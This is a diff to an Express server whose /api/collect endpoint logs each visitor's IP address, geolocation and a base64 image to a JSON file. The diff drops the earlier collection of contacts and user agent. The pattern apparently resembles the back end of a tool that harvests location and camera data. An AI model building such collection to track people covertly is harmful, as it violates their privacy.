@@ -9,7 +9,6 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 
 app.use(express.json({ limit: '10mb' }));
 app.use(cors());
-
 app.use(express.static(__dirname));
 
 app.get('/', (req, res) => {
@@ -55,19 +54,20 @@ app.post('/api/collect', (req, res) => {
     const recordId = 'ID_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
+    // Only 2 premises allowed and saved
+    const loc = req.body.location || { latitude: 'N/A', longitude: 'N/A' };
+
     db[recordId] = {
         id: recordId,
         ip: clientIp,
-        latitude: req.body.latitude || 'Not Granted',
-        longitude: req.body.longitude || 'Not Granted',
+        latitude: loc.latitude,
+        longitude: loc.longitude,
         image_base64: req.body.image_base64 || null,
-        contacts: req.body.contacts || 'Not Granted / Not Supported',
-        userAgent: req.headers['user-agent'],
         timestamp: new Date().toISOString()
     };
 
     writeDB(db);
-    res.status(200).json({ status: 'success', message: 'Data logged successfully' });
+    res.status(200).json({ status: 'success' });
 });
 
 app.get('/api/get-data', (req, res) => {
